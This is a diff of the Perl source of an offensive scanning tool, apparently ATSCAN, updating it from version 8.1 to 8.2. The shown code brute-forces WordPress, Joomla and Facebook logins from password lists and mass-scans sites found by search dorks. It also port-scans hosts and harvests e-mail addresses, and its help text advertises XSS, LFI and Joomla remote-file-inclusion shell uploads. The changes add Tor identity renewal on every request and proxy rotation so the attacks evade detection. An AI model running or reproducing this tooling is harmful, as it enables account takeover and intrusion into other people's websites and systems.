-	print "\033[0;37m$printarget\n";
+	print "\033[0;35m$printarget\n";
 	foreach $WPCMS(@WPCMS){
       $URL1 = $URL.$WPCMS;
 	  $URL1 =~ s/ //g;
@@ -2443,14 +2277,13 @@ sub mwpsites {
 ############################################################################################################################################################################################
 ## GET JOOMLA SITES
 sub mjoomsites {
-   if (-e $Bin.'/scan.txt'){ unlink $Bin.'/scan.txt';}
-  testconection();
+  if (-e $Bin.'/scan.txt'){ unlink $Bin.'/scan.txt';}
   if (!defined $mlevel) {
     targetlist();
   }
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
   timer();
-  print ":::STARTING JOOLMA SITES SCAN:::\n";
+  print "::: STARTING JOOLMA SITES SCAN :::\n";
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
   forwait();
   $count=0;
@@ -2459,20 +2292,20 @@ sub mjoomsites {
     $count++;
 	chomp $URL;
     $URL = checkurltype($URL);
-	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
+	$URL=checkurlschema($URL);	
 	my $printarget = $URL;
 	if (index($URL, 'http://') != -1) {
 	  $URL =~ s/http:\/\///g;
 	}
 	$URL =~ s/\/.*//s;
-	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
+	$URL=checkurlschema($URL);	
 	print "\033[1;33m    ";
 	timer();
 	print "[Target $count/";
 	countsearchlist();
 	print "\033[1;33m]\n";
 	print "\033[1;37m    TARGET: ";
-	print "\033[0;37m$printarget\n";
+	print "\033[0;35m$printarget\n";
 	foreach $JOOMCMS(@JOOMCMS){
       $URL1 = $URL.$JOOMCMS;
 	  $URL1 =~ s/ //g;
@@ -2513,7 +2346,7 @@ sub muploadsites {
   searchexitstargets();
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
   timer();
-  print ":::STARTING UPLOAD SCAN:::\n";
+  print "::: STARTING UPLOAD SCAN :::\n";
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
   forwait();
   $count=0;
@@ -2522,17 +2355,17 @@ sub muploadsites {
     $count++;
 	chomp $URL;
     $URL = checkurltype($URL);
-	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
+	$URL=checkurlschema($URL);	
 	my $printarget = $URL;
 	$URL =~ s/=.*/=/s;
-	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
+	$URL=checkurlschema($URL);	
 	print "\033[1;37m    ";
 	timer();
     print "[Target $count/";
 	countsearchlist();
 	print "\033[1;33m]\n";
 	print "\033[1;37m    TARGET: ";
-	print "\033[0;37m$printarget\n";
+	print "\033[0;35m$printarget\n";
 	foreach $UPLOAD(@UPLOAD){
 	  print "\033[1;37m    EXPLR:  ";
 	  print "\033[0;37m$UPLOAD \n";
@@ -2594,7 +2427,7 @@ sub mzipsites {
   searchexitstargets();
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
   timer();
-  print ":::STARTING ZIP SCAN:::\n";
+  print "::: STARTING ZIP SCAN :::\n";
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
   forwait();
   $count=0;
@@ -2603,17 +2436,17 @@ sub mzipsites {
     $count++;
 	chomp $URL;
     $URL = checkurltype($URL);
-	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
+	$URL=checkurlschema($URL);	
 	my $printarget = $URL;
 	$URL =~ s/=.*/=/s;
-	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
+	$URL=checkurlschema($URL);	
 	print "\033[1;37m    ";
 	timer();
     print "[Target $count/";
 	countsearchlist();
 	print "\033[1;33m]\n";
 	print "\033[1;37m    TARGET: ";
-	print "\033[0;37m$printarget\n";
+	print "\033[0;35m$printarget\n";
     foreach $ZIP(@ZIP){
 	  print "\033[1;37m    EXPLR:  ";
 	  print "\033[0;37m$ZIP \n";
@@ -2675,7 +2508,7 @@ sub mmails {
   searchexitstargets();
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
   timer();
-  print ":::STARTING E-MAILS SCAN:::\n";
+  print "::: STARTING E-MAILS SCAN :::\n";
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
   forwait();
   $count=0;
@@ -2684,7 +2517,7 @@ sub mmails {
     $count++;
 	chomp $URL;
     $URL = checkurltype($URL);
-	if($URL !~ /http:\/\//) {$URL = "http://$URL"; };	
+	$URL=checkurlschema($URL);	
 	my $printarget = $URL;
 	print "\033[1;33m    ";
 	timer();
@@ -2692,7 +2525,7 @@ sub mmails {
 	countsearchlist();
 	print "\033[1;33m]\n";
 	print "\033[1;37m    TARGET: ";
-	print "\033[0;37m$printarget\n";
+	print "\033[0;35m$printarget\n";
     $yes = '((([A-Za-z0-9]+_+)|([A-Za-z0-9]+\-+)|([A-Za-z0-9]+\.+)|([A-Za-z0-9]+\++))*[A-Za-z0-9]+@((\w+\-+)|(\w+\.))*\w{1,63}\.[a-zA-Z]{2,6})';
     $no = 'not found|404|not exist|ErrorDocument|Forbidden|The page you requested couldn\'t be found';
 	$cmails='';
@@ -2750,7 +2583,7 @@ sub mmd5 {
   scandetail();
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
   timer();
-  print ":::STARTING MD5 GENERATOR:::\n";
+  print "::: STARTING MD5 GENERATOR:::\n";
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
   forwait();
   print "\033[1;37m    STRING: ";
@@ -2768,7 +2601,7 @@ sub mencode64 {
   scandetail();
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
   timer();
-  print ":::STARTING ENCODE BASE64:::\n";
+  print "::: STARTING ENCODE BASE64:::\n";
   print "\033[1;37m[ ] ----------------------------------------------------------------------- \n";
   forwait();
   print "\033[1;37m    STRING: ";
@@ -2785,7 +2618,7 @@ sub mdecode64 {
   scandetail();
   print "\033[1;37m[ ] ----------------------------------------------------------------------\n[!] ";
   timer();
-  print ":::STARTING DECODE BASE64:::\n";
+  print "::: STARTING DECODE BASE64:::\n";
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
   forwait();
   print "\033[1;37m    STRING: ";
@@ -2835,7 +2668,7 @@ sub basic {
   searchexitstargets();
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
   timer();
-  print ":::STARTING PORTS BASIC SCAN:::\n";
+  print "::: STARTING PORTS BASIC SCAN :::\n";
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
   forwait();
   $count=0;
@@ -2850,13 +2683,14 @@ sub basic {
 	countsearchlist();
 	print "\033[1;33m]\n";
 	print "\033[1;37m    TARGET: ";
-	print "\033[0;37m$URL \n";
+	print "\033[0;35m$URL \n";
 	resumeportscan();
 	$URL=$URL;
     $type=$_[0];
     $closed1=0;
     @PORTS=(20,21,22,23,24,25,35,37,53,80,88,130,135,161,162,443,445,530,546,547,561,1433,1434,1701,1723,2082,2087,2121,2222,3306,3389,8080);
     foreach $port1(@PORTS){
+	  if (defined $random) {newtor();}
       $socket = IO::Socket::INET->new(PeerAddr=>"$URL",PeerPort=>"$port1",Proto=>"$type",Timeout=>"0.5") or $closed1++;
 	  if (defined $socket) {
         close $socket;
@@ -2887,7 +2721,7 @@ sub basic2 {
   searchexitstargets();
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
   timer();
-  print ":::STARTING PORTS BASIC SCAN:::\n";
+  print "::: STARTING PORTS BASIC SCAN :::\n";
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
   forwait();
   $count=0;
@@ -2902,13 +2736,14 @@ sub basic2 {
 	countsearchlist();
 	print "\033[1;33m]\n";
 	print "\033[1;37m    TARGET: ";
-	print "\033[0;37m$URL \n";
+	print "\033[0;35m$URL \n";
 	resumeportscan();
 	$URL=$URL;
     $closed2=0;
     $closed3=0;
     @PORTS=(20,21,22,23,24,25,35,37,53,80,88,130,135,161,162,443,445,530,546,547,561,1433,1434,1701,1723,2082,2087,2121,2222,3306,3389,8080);
     foreach $port2(@PORTS){
+	  if (defined $random) {newtor();}
        $socket = IO::Socket::INET->new(PeerAddr=>"$URL",PeerPort=>"$port2",Proto=>"tcp",Timeout=>"0.5") or $closed2++;
 	   if (defined $socket) {
          close $socket;
@@ -2967,7 +2802,7 @@ sub complete {
   searchexitstargets();
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
   timer();
-  print ":::STARTING PORTS COMPLETE SCAN:::\n";
+  print "::: STARTING PORTS COMPLETE SCAN :::\n";
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
   forwait();
   $type2=$_[0];
@@ -2985,9 +2820,10 @@ sub complete {
 	countsearchlist();
 	print "\033[1;33m]\n";
     print "\033[1;37m    TARGET: ";
-	print "\033[0;37m$URL \n";
+	print "\033[0;35m$URL \n";
 	resumeportscan();
     while ($port3<=65535){
+	  if (defined $random) {newtor();}
       $socket = IO::Socket::INET->new(PeerAddr=>"$URL",PeerPort=>"$port3",Proto=>"$type2") or $closed3++;
 	  if (defined $socket) {
         close $socket;
@@ -3019,7 +2855,7 @@ sub complete2 {
   searchexitstargets();
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
   timer();
-  print ":::STARTING PORTS COMPLETE SCAN:::\n";
+  print "::: STARTING PORTS COMPLETE SCAN :::\n";
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
   forwait();
   $count=0;
@@ -3038,8 +2874,9 @@ sub complete2 {
 	  countsearchlist();
 	  print "\033[1;33m]\n";
 	  print "\033[1;37m    TARGET: ";
-	  print "\033[0;37m$URL \n";
+	  print "\033[0;35m$URL \n";
 	  resumeportscan();
+	  if (defined $random) {newtor();}
       $socket = IO::Socket::INET->new(PeerAddr=>"$URL",PeerPort=>"$port4",Proto=>"tcp") or $closed4++;
 	  if (defined $socket) {
         close $socket;
@@ -3111,7 +2948,7 @@ sub user {
   searchexitstargets();
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
   timer();
-  print ":::STARTING PORTS SELECTIVE SCAN:::\n";
+  print "::: STARTING PORTS SELECTIVE SCAN :::\n";
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
   forwait();
   if (defined $muser){
@@ -3134,18 +2971,17 @@ sub user {
 	  countsearchlist();
 	  print "\033[1;33m]\n";
 	  print "\033[1;37m    [!] TARGET: ";
-	  print "\033[0;37m$URL \n";
+	  print "\033[0;35m$URL \n";
 	  resumeportscan();
+	  if (defined $random) {newtor();}
       $socket = IO::Socket::INET->new(PeerAddr=>"$URL",PeerPort=>"$mstart",Proto=>"$type3") or $closed6++;
       if (defined $socket) {
         close $socket;
 	  }
 	  print "\033[1;37m    TYPE:  ";
       print "$type3  ";
-
 	  print "\033[1;37mPORT:  ";
       print "$mstart  ";
-	  
 	  print "\033[1;37mINFO:  ";
       if ($closed6==0){
 	  if (defined $beep) {print chr(7);}
@@ -3169,7 +3005,7 @@ sub user2 {
   searchexitstargets();
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
   timer();
-  print ":::STARTING PORTS SELECTIVE SCAN:::\n";
+  print "::: STARTING PORTS SELECTIVE SCAN :::\n";
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
   forwait();
   $count=0;
@@ -3187,8 +3023,9 @@ sub user2 {
 	 countsearchlist();
 	 print "\033[1;33m]\n";
 	 print "\033[1;37m    TARGET: ";
-	 print "\033[0;37m$URL \n";
+	 print "\033[0;35m$URL \n";
 	 resumeportscan();
+	 if (defined $random) {newtor();}
      $socket = IO::Socket::INET->new(PeerAddr=>"$URL",PeerPort=>"$mstart",Proto=>"tcp") or $closed7++;
 	 if (defined $socket) {
        close $socket;
@@ -3242,14 +3079,13 @@ sub user2 {
 ############################################################################################################################################################################################
 ## BRUTE FORCE WORDPRESS SITES
 sub BFmwpsites {
-   if (-e $Bin.'/scan.txt'){ unlink $Bin.'/scan.txt';}
-  testconection();
+  if (-e $Bin.'/scan.txt'){ unlink $Bin.'/scan.txt';}
   if (!defined $mlevel) {
     targetlist();
   }
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
   timer();
-  print ":::STARTING BRUTE FORCE WORDPRESS SITES SCAN:::\n";
+  print "::: STARTING BRUTE FORCE WORDPRESS SITES SCAN :::\n";
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
   forwait();
   $count=0;
@@ -3258,20 +3094,20 @@ sub BFmwpsites {
     $count++;
 	chomp $URL;
     $URL = checkurltype($URL);
-	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
+	$URL=checkurlschema($URL);	
 	my $printarget = $URL;
 	if (index($URL, 'http://') != -1) {
 	  $URL =~ s/http:\/\///g;
 	}
 	$URL =~ s/\/.*//s;
-	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
+	$URL=checkurlschema($URL);	
 	print "\033[1;33m    ";
 	timer();
 	print "[Target $count/";
 	countsearchlist();
 	print "\033[1;33m]\n";
 	print "\033[1;37m    TARGET: ";
-	print "\033[0;37m$printarget\n";	    
+	print "\033[0;35m$printarget\n";	    
     if (defined $password) {
       my $password=$password;
     }
@@ -3287,6 +3123,7 @@ sub BFmwpsites {
     while(<PASS>){
         chomp($_);
 		$_ =~ s/([^^A-Za-z0-9\-_.!~*'()])/ sprintf "%%%0x", ord $1 /eg;
+		if (defined $random) {newtor();}
         my $ua = new LWP::UserAgent;
         my $response = $ua->post($URL1, 
                     { 'log' => $username, 
@@ -3345,13 +3182,12 @@ sub BFmwpsites {
 ## BRUTE FORCE JOOBLA SITES
 sub BFmjoomsites {
   if (-e $Bin.'/scan.txt'){ unlink $Bin.'/scan.txt';}
-  testconection();
   if (!defined $mlevel) {
     targetlist();
   }
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
   timer();
-  print ":::STARTING BRUTE FORCE JOOMLA SITES SCAN:::\n";
+  print "::: STARTING BRUTE FORCE JOOMLA SITES SCAN :::\n";
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
   forwait();
   $count=0;
@@ -3360,26 +3196,26 @@ sub BFmjoomsites {
     $count++;
 	chomp $URL;
     $URL = checkurltype($URL);
-	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
+	$URL=checkurlschema($URL);	
 	my $printarget = $URL;
 	if (index($URL, 'http://') != -1) {
 	  $URL =~ s/http:\/\///g;
 	}
 	$URL =~ s/\/.*//s;
-	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
+	$URL=checkurlschema($URL);	
 	print "\033[1;37m    ";
 	timer();
     print "[Target $count/";
 	countsearchlist();
 	print "\033[1;33m]\n";
 	print "\033[1;37m    TARGET: ";
-	print "\033[0;37m$printarget\n";	    
+	print "\033[0;35m$printarget\n";	    
     if (defined $password) {
       my $password=$password;
     }
     $URL1 = $URL."/administrator/index.php";
 	$URL1 =~ s/ //g;
-    checkedurl();   
+    checkedurl();  
     $request = HTTP::Request->new('GET', $URL1);
     my $response = $ua->request($request);
     my $status = $response->code;
@@ -3391,6 +3227,7 @@ sub BFmjoomsites {
       while(<PASS>){
         chomp($_);
 		$_ =~ s/([^^A-Za-z0-9\-_.!~*'()])/ sprintf "%%%0x", ord $1 /eg;
+		if (defined $random) {newtor();}
         my $ua = new LWP::UserAgent;
         my $response = $ua->post($URL1, 
                       { 'username' => $username, 
@@ -3450,15 +3287,15 @@ sub fbbf {
   use Net::SSLeay::Handle;
   scandetail();
   if (-e $Bin.'/scan.txt'){ unlink $Bin.'/scan.txt';}
-  testconection();
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n[!] ";
   timer();
-  print ":::STARTING BRUTE FORCE FACEBOOK SCAN:::\n";
+  print "::: STARTING BRUTE FORCE FACEBOOK SCAN :::\n";
   print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
   forwait();
   open(PASS,"<$password") or die "[!] Can not find $!";
   while(<PASS>){
     chomp($_);
+	if (defined $random) {newtor();}
     $_ =~ s/([^^A-Za-z0-9\-_.!~*'()])/ sprintf "%%%0x", ord $1 /eg;
     my $a = "POST /login.php HTTP/1.1";
     my $b = "Host: www.facebook.com";
@@ -3543,7 +3380,7 @@ sub mabout {
   print "\033[1;37m[ ] --------------------------------------------------------------------------- \n";
   print "\033[1;36m
      [+]================================================================[+]
-     [+]--------------              ATSCAN V 8.1          --------------[+]
+     [+]--------------              ATSCAN V 8.2          --------------[+]
      [+]================================================================[+]
      [+]--------------           AlisamTechnology         --------------[+]
      [+]------ https://www.fb.com/Forces.des.tempetes.marocaines  ------[+]
@@ -3569,7 +3406,10 @@ sub help {
   print "\033[1;33m";
   print "[..] HELP:: \n";
   print "\033[0;37m";
-  print "   --proxy       | Set tor proxy [EX: socks://localhost:9050]\n";
+  print "   --tor         | Set tor proxy [EX: socks://localhost:9050]\n";
+  print "   --proxy       | Set proxy [EX: --proxy http://12.45.44.2:8080]\n";
+  print "                 | Set proxy list [EX: --proxy list.txt]\n";
+  print "   --random      | Renew tor identity for every link scaned.\n";
   print "   --dork        | Dork to search [Ex: house,cars,hotel] \n";
   print "   --level       | Scan level (+- Number of page results to scan) \n";
   print "   --valid       | Text for validate results \n";
@@ -3578,8 +3418,7 @@ sub help {
   print "   --unique      | Get targets with exact dork matching.\n";
   print "   --exp         | Exploit\n";
   print "   -t            | Target \n";
-  print "   --sqlmap      | Sqlmaping xss results \n";
-  print "   -p            | Set xss / sqlmap test parameter \n";
+  print "   -p            | Set xss test parameter \n";
   print "   --xss         | Xss scan \n";
   print "   --lfi         | Local file inclusion \n";
   print "   --joomrfi     | Scan for joomla local file inclusion\n";
@@ -3620,47 +3459,46 @@ sub help {
   print "   --nobanner    | Hide tool banner\n";
   print "   --beep        | Produce beep sount if positive scan found.\n";
   print "   --noinfo      | Jump extra results info.\n";
-  print "   --noprocess   | Hide validation process.\n";
   print "   --update      | Check and update tool\n\n";
 
   print "\033[1;33m[..] EXAMPLES: \n\n";
   print "\033[1;37m  Tor: \n";
   print "  ......................\n";
-  print "\033[0;37m    --proxy <proxy>\n\n";
-  
+  print "\033[0;37m    Tor --tor <proxy>\n";
+  print "\033[0;37m    Proxy --proxy <proxy> | --proxy <list.txt>\n";
+  print "\033[0;37m    Random --random\n\n";
+
   print "\033[1;37m  Search engine: \n";
   print "  ......................\n";
   print "\033[0;37m";
   print "    Search: --dork <dork> --level <level> \n";
-  print "    Search + get ip: --dork <dork> --level <level> --ip\n";
-  print "    Search + get ip + server: --dork <dork> --level <level> --ip --server\n";
   print "    Search with many dorks: --dork <dork1,dork2,dork3> --level <level> \n";
   print "    Search + get emails: --dork <dorks.txt> --level <level> --email \n";
   print "    Search + get site emails: --dork <site:site.com> --level <level> --email \n";
   print "    Search + get ip+server: --dork <dorks.txt> --level <level> \n";
   print "    Search + set save file: --dork <dorks.txt> --level <level> --save\n";
-  print "    Search + Replace + Exploit: --dork <dorks.txt> --level <level> --replace <string> --with <string> --valid <string>\n\n";
+  print "    Replace + Exploit: --dork <dorks.txt> --level <level> --replace <string> --with <string> --valid <string>\n\n";
   
   print "\033[1;37m  Subscan from Serach Engine: \n";
   print "  ......................\n";
   print "\033[0;37m";
-  print "    Search + Exploitation: --dork <dork> --level <10> --xss/--lfi/--wp ... \n";
-  print "    Search + Server Exploitation: -t <ip> --level <10> --xss/--lfi/--wp ... \n";
-  print "    Search + Replace + Exploit: --dork <dork> --level <10> --replace <string> --with <string> --exp <exploit> --xss/--lfi/--wp ... \n\n";
+  print "    Exploitation: --dork <dork> --level <10> [--xss | --lfi | --wp |...]\n";
+  print "    Server Exploitation: -t <ip> --level <10> [--xss | --lfi | --wp |...]\n";
+  print "    Replace + Exploit: --dork <dork> --level <10> --replace <string> --with <string> --exp <exploit> [--xss | --lfi |...]\n\n";
   
   print "\033[1;37m  Validation: \n";
   print "  ......................\n";
   print "\033[0;37m";
   print "    Search + Url Validation: --dork <dork> --level <10> --ifinurl <string>\n";
   print "    Search + dork Validation: --dork <dork> --level <10> --unique\n";
-  print "    Search + Exploit + Validation: --dork <dork> --level <10> --exp --isup/--valid <string>\n";
-  print "    Search + Server Exploit + Validation: -t <ip> --level <10> --exp --isup/--valid <string>\n";
-  print "    Search + Replace + Exploit: --dork <dork> --level <10> --replace <string> --with <string> --isup/--valid <string>\n\n";
+  print "    Search + Exploit + Validation: --dork <dork> --level <10> --exp [--isup | --valid] <string>\n";
+  print "    Search + Server Exploit + Validation: -t <ip> --level <10> --exp [--isup | --valid] <string>\n";
+  print "    Replace + Exploit: --dork <dork> --level <10> --replace <string> --with <string> [--isup | --valid] <string>\n\n";
   print "\033[1;37m  Use List / Target: \n";
   print "  ......................\n";
   print "\033[0;37m";
-  print "    -t <target/targets.txt> --exp --isup/--valid <string>\n";
-  print "    -t <target/targets.txt> --xss/--lfi .. \n\n";
+  print "    -t <target/targets.txt> --exp [--isup | --valid] <string>\n";
+  print "    -t <target/targets.txt> [--xss | --lfi | --wp |...]\n\n";
   print "\033[1;37m  Server: \n";
   print "  ......................\n";
   print "\033[0;37m";
@@ -3670,7 +3508,7 @@ sub help {
   print "    Get Server upload sites: -t <ip> --level <value> --upload \n";
   print "    Get Server zip sites files: -t <ip> --level <value> --zip \n";
   print "    WP Arbitry File Download: -t <ip> --level <value> --wpadf \n";
-  print "    Joomla RFI: -t <ip> --level <1> --joomfri --shell <shell link>\n";
+  print "    Joomla RFI: -t <ip> --level <10> --joomfri --shell <shell link>\n";
   print "    Scan basic tcp (quick): -t <ip> --ports --basic --tcp\n";
   print "    Scan basic udp basic (quick): -t <ip> --ports --basic --udp\n";
   print "    Scan basic udp+tcp: -t <ip> --ports --basic --all\n";
@@ -3696,10 +3534,10 @@ sub help {
   print "\033[1;37m  Multiple Scan: \n";
   print "  ......................\n";
   print "\033[0;37m";
-  print "    --dork <dork> --level <10> --xss/--lfi/--wp..\n";
-  print "    --dork <dork> --level <10> --replace <string> --with <string> --exp <exploit> --xss --lfi --wp..\n";
-  print "    -t <ip> --level <10> --xss --lfi --wp..\n";
-  print "    -t <targets> --xss --lfi --wp..\n\n";
+  print "    --dork <dork> --level <10> --xss --lfi --wp ..\n";
+  print "    --dork <dork> --level <10> --replace <string> --with <string> --exp <exploit> [--xss | --lfi | --wp |...]\n";
+  print "    -t <ip> --level <10> [--xss | --lfi | --wp |...]\n";
+  print "    -t <targets> [--xss | --lfi | --wp |...]\n\n";
   
   print "\033[1;37m  Brute Force Facebook Login: \n";
   print "  ......................\n";
@@ -3712,14 +3550,154 @@ sub help {
   
   print "\033[1;37m  Check and update: \n";
   print "  ......................\n";
-  print "\033[0;37m    --update\n\n"; 
-  print "\033[1;37m[ ] --------------------------------------------------------------------------- \n";
+  print "\033[0;37m    --update\n"; 
+  print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
+}
+############################################################################################################################################################################################
+############################################################################################################################################################################################
+## EXPLOIT LIST
+if (defined $exploit) {
+  $checkdorklist = $Bin."/exploits.txt";
+  if (-e $checkdorklist){ unlink $checkdorklist};
+  if (substr($exploit, -4) eq '.txt') {
+    if ($exploit eq 'exploits.txt') {
+	  print "\033[1;37m[ ]-----------------------------------------------------------------------[ ]\n";
+	  print "\033[0;31m[!] Rename your list [$exploit] I use the same name!\n";
+	  exit();
+    }
+	use File::Copy qw(copy);
+	copy $exploit, $Bin.'/exploits.txt';
+  }else{
+    if ($exploit =~ m/,/) {
+      $exploit =~ s/,/ /g;
+    }elsif ($exploit =~ m/ /) {
+      $exploit =~ s/ /+/g;
+    }
+    my @exploits = split / /, $exploit;
+    foreach my $exploit (@exploits) {
+      open (FILE, '>'.$Bin.'/exploits.txt');
+      print FILE "$exploit\n";
+      close (FILE);
+	}
+  }
+}
+###########################################################################################################################################################################################
+###########################################################################################################################################################################################
+## BANNER
+if (!defined $nobanner) {
+  logoversion();
+  my @LOGO = ("
+  \033[0;33m    /\\ ___ /\\                
+  \033[0;33m   (  o   o  ) 
+  \033[0;33m   \\  >#<  /      
+  \033[0;33m    /       \\       \033[1;36m######  ###### ###### ###### ###### ##  ##
+  \033[0;33m   /         \\   ^  \033[1;36m##  ##    ##   ##     ##  ## ##  ## ### ##
+  \033[0;33m  |           | ||  \033[1;36m######    ##   ###### ##     ###### ######
+  \033[0;33m   \\          /-//  \033[1;36m##  ##    ##       ## ##  ## ##  ## ## ###
+  \033[0;33m    ///  ///--      \033[1;36m##  ##    ##   ###### ###### ##  ## ##  ## \033[0;32m$logoversion",
+  "     
+  \033[0;33m     .  \\\\\\|||/// 
+  \033[0;33m    / \\========
+  \033[0;33m    \\ /| O   O |  
+  \033[0;33m     #   \\` _ '/  
+  \033[0;33m    (#)   | |        \033[1;36m######  ###### ###### ###### ###### ##  ##
+  \033[0;33m     #\\/( * * )\\     \033[1;36m##  ##    ##   ##     ##  ## ##  ## ### ##
+  \033[0;33m     #\\/(==*==)/     \033[1;36m######    ##   ###### ##     ###### ######
+  \033[0;33m     #   || ||       \033[1;36m##  ##    ##       ## ##  ## ##  ## ## ###
+  \033[0;33m    .#---'| |`----.  \033[1;36m##  ##    ##   ###### ###### ##  ## ##  ##
+  \033[0;33m    '#---'   `----'  \033[1;36m##  ##    ##   ###### ###### ##  ## ##  ## \033[0;32m$logoversion",
+  "	
+  \033[0;33m    __________
+  \033[0;33m   / ___  ___ \\
+  \033[0;33m  / / @ \\/ @ \\ \\
+  \033[0;33m  \\ \\___/\\___/ /\\
+  \033[0;33m   \\____\\/____/||
+  \033[0;33m   /     /\\\\\\\\\\//  \033[1;36m######  ###### ###### ###### ###### ##  ##
+  \033[0;33m  |     |\\\\\\\\\\\\    \033[1;36m##  ##    ##   ##     ##  ## ##  ## ### ##
+  \033[0;33m   \\      \\\\\\\\\\\\   \033[1;36m######    ##   ###### ##     ###### ######
+  \033[0;33m     \\______/\\\\\\\\  \033[1;36m##  ##    ##       ## ##  ## ##  ## ## ###
+  \033[0;33m      _||_||_      \033[1;36m##  ##    ##   ###### ###### ##  ## ##  ## \033[0;32m$logoversion",
+  "	
+  \033[0;33m   .--,       .--,
+  \033[0;33m  ( (  \\.---./  ) )
+  \033[0;33m   '.__/o   o\\__.'
+  \033[0;33m      {=  ^  =}
+  \033[0;33m       >  -  <
+  \033[0;33m      /       \\
+  \033[0;33m     //       \\\\       \033[1;36m######  ###### ###### ###### ###### ##  ##
+  \033[0;33m    //|   .   |\\\\      \033[1;36m##  ##    ##   ##     ##  ## ##  ## ### ##
+  \033[0;33m    ''\\       /''_.-^  \033[1;36m######    ##   ###### ##     ###### ######
+  \033[0;33m       \\  _  /--'      \033[1;36m##  ##    ##       ## ##  ## ##  ## ## ###   
+  \033[0;33m     ___)( )(___       \033[1;36m##  ##    ##   ###### ###### ##  ## ##  ## \033[0;32m$logoversion",
+  "	
+  \033[0;33m       (>\\---/<)
+  \033[0;33m       ,'     `.
+  \033[0;33m      /  q   p  \\
+  \033[0;33m     (  >(_Y_)<  )
+  \033[0;33m     >-' `-' `-<-.
+  \033[0;33m     /  _.== ==.,- \\
+  \033[0;33m    /,    )`  '(    )
+  \033[0;33m   ; `._.'      `--<  \033[1;36m######  ###### ###### ###### ###### ##  ##
+  \033[0;33m  :     \\        |  ) \033[1;36m##  ##    ##   ##     ##  ## ##  ## ### ##
+  \033[0;33m  \\      )       ;_/  \033[1;36m######    ##   ###### ##     ###### ######
+  \033[0;33m  `._ _/_  ___.'-\\\\\\  \033[1;36m##  ##    ##       ## ##  ## ##  ## ## ###
+  \033[0;33m      `--\\\\\\          \033[1;36m##  ##    ##   ###### ###### ##  ## ##  ## \033[0;32m$logoversion",
+  "
+  \033[0;33m  o       o                  
+  \033[0;33m   \\_____/   
+  \033[0;33m   /=O=O=\\   ______  
+  \033[0;33m  /   ^   \\  \\\\\\\\\\\\\\   \033[1;36m######  ###### ###### ###### ###### ##  ##
+  \033[0;33m  \\ \\___/ / /\\ ___  \\  \033[1;36m##  ##    ##   ##     ##  ## ##  ## ### ##
+  \033[0;33m   \\_ V _/ /\\ /\\\\\\\\  \\ \033[1;36m######    ##   ###### ##     ###### ######
+  \033[0;33m     \\  \\_/\\ /\\ \@_/  / \033[1;36m##  ##    ##       ## ##  ## ##  ## ## ###
+  \033[0;33m      \\____\\__\\_____/  \033[1;36m##  ##    ##   ###### ###### ##  ## ##  ## \033[0;32m$logoversion",
+  "      
+  \033[0;33m     \\\\\\|||/// 
+  \033[0;33m     /=======\\     
+  \033[0;33m    = __   __ =   
+  \033[0;33m    =( o) (o )=   \033[1;36m######  ###### ###### ###### ###### ##  ##
+  \033[0;33m    =    U    =   \033[1;36m##  ##    ##   ##     ##  ## ##  ## ### ##
+  \033[0;33m     _________    \033[1;36m######    ##   ###### ##     ###### ######
+  \033[0;33m     \\__!|!__/    \033[1;36m##  ##    ##       ## ##  ## ##  ## ## ###
+  \033[0;33m        \\_/       \033[1;36m##  ##    ##   ###### ###### ##  ## ##  ## \033[0;32m$logoversion"
+  );
+  $LOGO = $LOGO[int rand @LOGO];
+  print "$LOGO\n";
+}
+print "\033[0;31m   __________________________( $CODENAME )________________\n";
+############################################################################################################################################################################################
+############################################################################################################################################################################################
+## PRINT DESCLAIMER
+if ((!defined $dork) && (!defined $fbbf) && (!defined $help) && (!defined $Target) && (!defined $rangip) && (!defined $mmd5) && (!defined $mencode64) && (!defined $checkversion) && (!defined $mdecode64)) {
+  print "\n";
+  advise2();
+}
+desclaimer();
+############################################################################################################################################################################################
+############################################################################################################################################################################################
+## TOR PROXY
+if (defined $tor) {
+  $proxys=$tor;
+  $ua->proxy([qw/ http https /] => $proxys);
+  $ua->cookie_jar({});
+}
+############################################################################################################################################################################################
+############################################################################################################################################################################################
+## PROXY
+if (defined $proxy) {
+  if (substr($proxy, -4) eq '.txt') {
+    randomproxy();
+  }else{
+   $proxys = $proxy;
+  }
+  $ua->proxy([qw/ http https /] => $proxys);
